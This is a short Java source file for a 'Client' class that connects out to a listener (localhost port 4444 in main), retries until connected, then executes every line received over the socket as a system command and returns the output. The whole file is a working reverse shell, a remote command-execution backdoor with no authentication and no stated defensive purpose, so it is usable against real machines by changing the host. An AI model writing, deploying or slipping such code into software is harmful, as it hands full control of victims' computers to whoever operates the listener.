import java.net.Socket;
import java.io.IOException;
import java.io.PrintWriter;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.Scanner;

public class Client {
    private Socket connection;
    private Scanner scanner;
    private PrintWriter pw;


    public Client(String hostname, int port) {
        while(true) {
            try {
                this.connection = new Socket(hostname, port);
                this.scanner = new Scanner(this.connection.getInputStream());
                this.pw = new PrintWriter(this.connection.getOutputStream());
                break;
            } catch (IOException ioe) {
              System.out.println("Trying again...");
            }
        }

    }

    public void run() {
        while (true) {
            String cmd = this.scanner.nextLine();
            String result = "";
            try {
                result = this.execute(cmd);
            } catch (IOException ioe) {
                result = "1\nCommand Failed";
            }
            this.pw.println(result);
            this.pw.flush();
        }
    }

    /*
    * Execute a command, and return the output
    *
    *  @param cmd is the shell command to execute
    *  @return the output of the command, as a String,
    *  prepended by the number of lines in the command output
    */
    public String execute(String cmd) throws IOException {
        int lines = 0;
        Process process = Runtime.getRuntime().exec(cmd);
        StringBuilder output = new StringBuilder();
        BufferedReader br = new BufferedReader(new InputStreamReader(process.getInputStream()));
        String line;
        while((line = br.readLine()) != null) {
            output.append(line + "\n");
            lines++;
        }
        return "" + lines + "\n" + output.toString();
    }

    public static void main(String[] args) {
        Client c = new Client("localhost", 4444);
        c.run();
    }
}

